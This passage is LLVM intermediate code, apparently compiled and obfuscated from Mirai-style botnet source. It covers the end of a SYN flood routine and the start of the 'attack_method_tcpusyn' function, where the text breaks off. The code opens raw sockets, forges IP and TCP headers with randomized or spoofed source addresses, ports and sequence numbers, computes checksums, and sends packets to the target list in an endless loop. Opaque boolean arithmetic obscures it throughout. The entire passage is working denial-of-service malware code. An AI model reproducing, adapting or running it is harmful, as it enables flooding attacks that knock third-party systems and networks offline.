  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %599

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %599

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %424, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %429

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 -74, -1
  %137 = or i8 %134, %135
  %138 = or i8 -74, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = xor i8 %140, -1
  %143 = xor i8 64, -1
  %144 = xor i8 -89, -1
  %145 = and i8 %142, -89
  %146 = and i8 %140, %144
  %147 = and i8 %143, -89
  %148 = and i8 64, %144
  %149 = or i8 %145, %146
  %150 = or i8 %147, %148
  %151 = xor i8 %149, %150
  %152 = or i8 %142, %143
  %153 = xor i8 %152, -1
  %154 = or i8 -89, %144
  %155 = and i8 %153, %154
  %156 = or i8 %151, %155
  %157 = or i8 %140, 64
  store i8 %156, i8* %132, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = load i8, i8* %159, align 4
  %161 = xor i8 %160, -1
  %162 = xor i8 -16, -1
  %163 = xor i8 71, -1
  %164 = or i8 %161, %162
  %165 = or i8 71, %163
  %166 = xor i8 %164, -1
  %167 = and i8 %166, %165
  %168 = and i8 %160, -16
  %169 = and i8 %167, 5
  %170 = xor i8 %167, 5
  %171 = or i8 %169, %170
  %172 = or i8 %167, 5
  store i8 %171, i8* %159, align 4
  %173 = load i8, i8* %12, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 1
  store i8 %173, i8* %175, align 1
  %176 = call zeroext i16 @htons(i16 zeroext 60) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %13, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %14, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %113
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %113
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = xor i16 %222, -1
  %224 = xor i16 -241, -1
  %225 = xor i16 24996, -1
  %226 = or i16 %223, %224
  %227 = or i16 24996, %225
  %228 = xor i16 %226, -1
  %229 = and i16 %228, %227
  %230 = and i16 %222, -241
  %231 = and i16 %229, 160
  %232 = xor i16 %229, 160
  %233 = or i16 %231, %232
  %234 = or i16 %229, 160
  store i16 %233, i16* %221, align 4
  %235 = load i8, i8* %20, align 1
  %236 = sext i8 %235 to i16
  %237 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 4
  %239 = load i16, i16* %238, align 4
  %240 = xor i16 %236, -1
  %241 = xor i16 1, -1
  %242 = xor i16 16505, -1
  %243 = or i16 %240, %241
  %244 = or i16 16505, %242
  %245 = xor i16 %243, -1
  %246 = and i16 %245, %244
  %247 = and i16 %236, 1
  %248 = shl i16 %246, 13
  %249 = xor i16 %239, -1
  %250 = xor i16 -8193, -1
  %251 = xor i16 -18994, -1
  %252 = or i16 %249, %250
  %253 = or i16 -18994, %251
  %254 = xor i16 %252, -1
  %255 = and i16 %254, %253
  %256 = and i16 %239, -8193
  %257 = and i16 %255, %248
  %258 = xor i16 %255, %248
  %259 = or i16 %257, %258
  %260 = or i16 %255, %248
  store i16 %259, i16* %238, align 4
  %261 = load i8, i8* %21, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = xor i16 %262, -1
  %267 = xor i16 1, -1
  %268 = xor i16 7407, -1
  %269 = or i16 %266, %267
  %270 = or i16 7407, %268
  %271 = xor i16 %269, -1
  %272 = and i16 %271, %270
  %273 = and i16 %262, 1
  %274 = shl i16 %272, 12
  %275 = xor i16 -4097, -1
  %276 = xor i16 %265, %275
  %277 = and i16 %276, %265
  %278 = and i16 %265, -4097
  %279 = and i16 %277, %274
  %280 = xor i16 %277, %274
  %281 = or i16 %279, %280
  %282 = or i16 %277, %274
  store i16 %281, i16* %264, align 4
  %283 = load i8, i8* %22, align 1
  %284 = sext i8 %283 to i16
  %285 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = xor i16 1, -1
  %289 = xor i16 %284, %288
  %290 = and i16 %289, %284
  %291 = and i16 %284, 1
  %292 = shl i16 %290, 11
  %293 = xor i16 %287, -1
  %294 = xor i16 -2049, -1
  %295 = xor i16 -6676, -1
  %296 = or i16 %293, %294
  %297 = or i16 -6676, %295
  %298 = xor i16 %296, -1
  %299 = and i16 %298, %297
  %300 = and i16 %287, -2049
  %301 = and i16 %299, %292
  %302 = xor i16 %299, %292
  %303 = or i16 %301, %302
  %304 = or i16 %299, %292
  store i16 %303, i16* %286, align 4
  %305 = load i8, i8* %23, align 1
  %306 = sext i8 %305 to i16
  %307 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 4
  %309 = load i16, i16* %308, align 4
  %310 = xor i16 1, -1
  %311 = xor i16 %306, %310
  %312 = and i16 %311, %306
  %313 = and i16 %306, 1
  %314 = shl i16 %312, 10
  %315 = xor i16 -1025, -1
  %316 = xor i16 %309, %315
  %317 = and i16 %316, %309
  %318 = and i16 %309, -1025
  %319 = and i16 %317, %314
  %320 = xor i16 %317, %314
  %321 = or i16 %319, %320
  %322 = or i16 %317, %314
  store i16 %321, i16* %308, align 4
  %323 = load i8, i8* %24, align 1
  %324 = sext i8 %323 to i16
  %325 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = xor i16 %324, -1
  %329 = xor i16 1, -1
  %330 = xor i16 -13785, -1
  %331 = or i16 %328, %329
  %332 = or i16 -13785, %330
  %333 = xor i16 %331, -1
  %334 = and i16 %333, %332
  %335 = and i16 %324, 1
  %336 = shl i16 %334, 9
  %337 = xor i16 -513, -1
  %338 = xor i16 %327, %337
  %339 = and i16 %338, %327
  %340 = and i16 %327, -513
  %341 = and i16 %339, %336
  %342 = xor i16 %339, %336
  %343 = or i16 %341, %342
  %344 = or i16 %339, %336
  store i16 %343, i16* %326, align 4
  %345 = load i8, i8* %25, align 1
  %346 = sext i8 %345 to i16
  %347 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %348 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %347, i32 0, i32 4
  %349 = load i16, i16* %348, align 4
  %350 = xor i16 %346, -1
  %351 = xor i16 1, -1
  %352 = xor i16 -5677, -1
  %353 = or i16 %350, %351
  %354 = or i16 -5677, %352
  %355 = xor i16 %353, -1
  %356 = and i16 %355, %354
  %357 = and i16 %346, 1
  %358 = shl i16 %356, 8
  %359 = xor i16 -257, -1
  %360 = xor i16 %349, %359
  %361 = and i16 %360, %349
  %362 = and i16 %349, -257
  %363 = xor i16 %361, -1
  %364 = xor i16 %358, -1
  %365 = xor i16 23087, -1
  %366 = and i16 %363, 23087
  %367 = and i16 %361, %365
  %368 = and i16 %364, 23087
  %369 = and i16 %358, %365
  %370 = or i16 %366, %367
  %371 = or i16 %368, %369
  %372 = xor i16 %370, %371
  %373 = or i16 %363, %364
  %374 = xor i16 %373, -1
  %375 = or i16 23087, %365
  %376 = and i16 %374, %375
  %377 = or i16 %372, %376
  %378 = or i16 %361, %358
  store i16 %377, i16* %348, align 4
  %379 = load i8*, i8** %29, align 8
  %380 = getelementptr inbounds i8, i8* %379, i32 1
  store i8* %380, i8** %29, align 8
  store i8 2, i8* %379, align 1
  %381 = load i8*, i8** %29, align 8
  %382 = getelementptr inbounds i8, i8* %381, i32 1
  store i8* %382, i8** %29, align 8
  store i8 4, i8* %381, align 1
  %383 = call i32 @rand_next()
  %384 = xor i32 15, -1
  %385 = xor i32 %383, %384
  %386 = and i32 %385, %383
  %387 = and i32 %383, 15
  %388 = sub i32 0, 1400
  %389 = sub i32 0, %386
  %390 = add i32 %388, %389
  %391 = sub i32 0, %390
  %392 = add i32 1400, %386
  %393 = trunc i32 %391 to i16
  %394 = call zeroext i16 @htons(i16 zeroext %393) #7
  %395 = load i8*, i8** %29, align 8
  %396 = bitcast i8* %395 to i16*
  store i16 %394, i16* %396, align 2
  %397 = load i8*, i8** %29, align 8
  %398 = getelementptr inbounds i8, i8* %397, i64 2
  store i8* %398, i8** %29, align 8
  %399 = load i8*, i8** %29, align 8
  %400 = getelementptr inbounds i8, i8* %399, i32 1
  store i8* %400, i8** %29, align 8
  store i8 4, i8* %399, align 1
  %401 = load i8*, i8** %29, align 8
  %402 = getelementptr inbounds i8, i8* %401, i32 1
  store i8* %402, i8** %29, align 8
  store i8 2, i8* %401, align 1
  %403 = load i8*, i8** %29, align 8
  %404 = getelementptr inbounds i8, i8* %403, i32 1
  store i8* %404, i8** %29, align 8
  store i8 8, i8* %403, align 1
  %405 = load i8*, i8** %29, align 8
  %406 = getelementptr inbounds i8, i8* %405, i32 1
  store i8* %406, i8** %29, align 8
  store i8 10, i8* %405, align 1
  %407 = call i32 @rand_next()
  %408 = load i8*, i8** %29, align 8
  %409 = bitcast i8* %408 to i32*
  store i32 %407, i32* %409, align 4
  %410 = load i8*, i8** %29, align 8
  %411 = getelementptr inbounds i8, i8* %410, i64 4
  store i8* %411, i8** %29, align 8
  %412 = load i8*, i8** %29, align 8
  %413 = bitcast i8* %412 to i32*
  store i32 0, i32* %413, align 4
  %414 = load i8*, i8** %29, align 8
  %415 = getelementptr inbounds i8, i8* %414, i64 4
  store i8* %415, i8** %29, align 8
  %416 = load i8*, i8** %29, align 8
  %417 = getelementptr inbounds i8, i8* %416, i32 1
  store i8* %417, i8** %29, align 8
  store i8 1, i8* %416, align 1
  %418 = load i8*, i8** %29, align 8
  %419 = getelementptr inbounds i8, i8* %418, i32 1
  store i8* %419, i8** %29, align 8
  store i8 3, i8* %418, align 1
  %420 = load i8*, i8** %29, align 8
  %421 = getelementptr inbounds i8, i8* %420, i32 1
  store i8* %421, i8** %29, align 8
  store i8 3, i8* %420, align 1
  %422 = load i8*, i8** %29, align 8
  %423 = getelementptr inbounds i8, i8* %422, i32 1
  store i8* %423, i8** %29, align 8
  store i8 6, i8* %422, align 1
  br label %424

; <label>:424:                                    ; preds = %192
  %425 = load i32, i32* %9, align 4
  %426 = sub i32 0, 1
  %427 = sub i32 %425, %426
  %428 = add nsw i32 %425, 1
  store i32 %427, i32* %9, align 4
  br label %108

; <label>:429:                                    ; preds = %108
  br label %430

; <label>:430:                                    ; preds = %598, %429
  store i32 0, i32* %9, align 4
  br label %431

; <label>:431:                                    ; preds = %593, %430
  %432 = load i32, i32* %9, align 4
  %433 = load i8, i8* %5, align 1
  %434 = zext i8 %433 to i32
  %435 = icmp slt i32 %432, %434
  br i1 %435, label %436, label %598

; <label>:436:                                    ; preds = %431
  %437 = load i8**, i8*** %11, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds i8*, i8** %437, i64 %439
  %441 = load i8*, i8** %440, align 8
  store i8* %441, i8** %30, align 8
  %442 = load i8*, i8** %30, align 8
  %443 = bitcast i8* %442 to %struct.iphdr*
  store %struct.iphdr* %443, %struct.iphdr** %31, align 8
  %444 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i64 1
  %446 = bitcast %struct.iphdr* %445 to %struct.tcphdr*
  store %struct.tcphdr* %446, %struct.tcphdr** %32, align 8
  %447 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i32 0, i32 2
  %452 = load i8, i8* %451, align 4
  %453 = zext i8 %452 to i32
  %454 = icmp slt i32 %453, 32
  br i1 %454, label %455, label %479

; <label>:455:                                    ; preds = %436
  %456 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %457 = load i32, i32* %9, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i32 0, i32 1
  %461 = load i32, i32* %460, align 4
  %462 = call i32 @ntohl(i32 %461) #7
  %463 = call i32 @rand_next()
  %464 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %465 = load i32, i32* %9, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %467, i32 0, i32 2
  %469 = load i8, i8* %468, align 4
  %470 = zext i8 %469 to i32
  %471 = lshr i32 %463, %470
  %472 = sub i32 %462, 605163564
  %473 = add i32 %472, %471
  %474 = add i32 %473, 605163564
  %475 = add i32 %462, %471
  %476 = call i32 @htonl(i32 %474) #7
  %477 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 9
  store i32 %476, i32* %478, align 4
  br label %479

; <label>:479:                                    ; preds = %455, %436
  %480 = load i32, i32* %26, align 4
  %481 = icmp eq i32 %480, -1
  br i1 %481, label %482, label %486

; <label>:482:                                    ; preds = %479
  %483 = call i32 @rand_next()
  %484 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 8
  store i32 %483, i32* %485, align 4
  br label %486

; <label>:486:                                    ; preds = %482, %479
  %487 = load i16, i16* %13, align 2
  %488 = zext i16 %487 to i32
  %489 = icmp eq i32 %488, 65535
  br i1 %489, label %490, label %499

; <label>:490:                                    ; preds = %486
  %491 = call i32 @rand_next()
  %492 = xor i32 65535, -1
  %493 = xor i32 %491, %492
  %494 = and i32 %493, %491
  %495 = and i32 %491, 65535
  %496 = trunc i32 %494 to i16
  %497 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 3
  store i16 %496, i16* %498, align 4
  br label %499

; <label>:499:                                    ; preds = %490, %486
  %500 = load i16, i16* %16, align 2
  %501 = zext i16 %500 to i32
  %502 = icmp eq i32 %501, 65535
  br i1 %502, label %503, label %512

; <label>:503:                                    ; preds = %499
  %504 = call i32 @rand_next()
  %505 = xor i32 65535, -1
  %506 = xor i32 %504, %505
  %507 = and i32 %506, %504
  %508 = and i32 %504, 65535
  %509 = trunc i32 %507 to i16
  %510 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 0
  store i16 %509, i16* %511, align 4
  br label %512

; <label>:512:                                    ; preds = %503, %499
  %513 = load i16, i16* %17, align 2
  %514 = zext i16 %513 to i32
  %515 = icmp eq i32 %514, 65535
  br i1 %515, label %516, label %525

; <label>:516:                                    ; preds = %512
  %517 = call i32 @rand_next()
  %518 = xor i32 65535, -1
  %519 = xor i32 %517, %518
  %520 = and i32 %519, %517
  %521 = and i32 %517, 65535
  %522 = trunc i32 %520 to i16
  %523 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 1
  store i16 %522, i16* %524, align 2
  br label %525

; <label>:525:                                    ; preds = %516, %512
  %526 = load i32, i32* %18, align 4
  %527 = icmp eq i32 %526, 65535
  br i1 %527, label %528, label %532

; <label>:528:                                    ; preds = %525
  %529 = call i32 @rand_next()
  %530 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 2
  store i32 %529, i32* %531, align 4
  br label %532

; <label>:532:                                    ; preds = %528, %525
  %533 = load i32, i32* %19, align 4
  %534 = icmp eq i32 %533, 65535
  br i1 %534, label %535, label %539

; <label>:535:                                    ; preds = %532
  %536 = call i32 @rand_next()
  %537 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 3
  store i32 %536, i32* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %535, %532
  %540 = load i8, i8* %20, align 1
  %541 = icmp ne i8 %540, 0
  br i1 %541, label %542, label %555

; <label>:542:                                    ; preds = %539
  %543 = call i32 @rand_next()
  %544 = xor i32 %543, -1
  %545 = xor i32 65535, -1
  %546 = xor i32 -868665277, -1
  %547 = or i32 %544, %545
  %548 = or i32 -868665277, %546
  %549 = xor i32 %547, -1
  %550 = and i32 %549, %548
  %551 = and i32 %543, 65535
  %552 = trunc i32 %550 to i16
  %553 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  br label %555

; <label>:555:                                    ; preds = %542, %539
  %556 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 0, i16* %557, align 2
  %558 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %559 = bitcast %struct.iphdr* %558 to i16*
  %560 = call zeroext i16 @checksum_generic(i16* %559, i32 20)
  %561 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %562 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %561, i32 0, i32 7
  store i16 %560, i16* %562, align 2
  %563 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %564 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %563, i32 0, i32 6
  store i16 0, i16* %564, align 4
  %565 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %566 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %567 = bitcast %struct.tcphdr* %566 to i8*
  %568 = call zeroext i16 @htons(i16 zeroext 40) #7
  %569 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %565, i8* %567, i16 zeroext %568, i32 40)
  %570 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 6
  store i16 %569, i16* %571, align 4
  %572 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 1
  %574 = load i16, i16* %573, align 2
  %575 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %576 = load i32, i32* %9, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %575, i64 %577
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %578, i32 0, i32 0
  %580 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %579, i32 0, i32 1
  store i16 %574, i16* %580, align 2
  %581 = load i32, i32* %10, align 4
  %582 = load i8*, i8** %30, align 8
  %583 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %584 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %585 = load i32, i32* %9, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i32 0, i32 0
  %589 = bitcast %struct.sockaddr_in* %588 to %struct.sockaddr*
  store %struct.sockaddr* %589, %struct.sockaddr** %583, align 8
  %590 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %591 = load %struct.sockaddr*, %struct.sockaddr** %590, align 8
  %592 = call i64 @sendto(i32 %581, i8* %582, i64 60, i32 16384, %struct.sockaddr* %591, i32 16)
  br label %593

; <label>:593:                                    ; preds = %555
  %594 = load i32, i32* %9, align 4
  %595 = sub i32 0, 1
  %596 = sub i32 %594, %595
  %597 = add nsw i32 %594, 1
  store i32 %596, i32* %9, align 4
  br label %431

; <label>:598:                                    ; preds = %431
  br label %430

; <label>:599:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpusyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
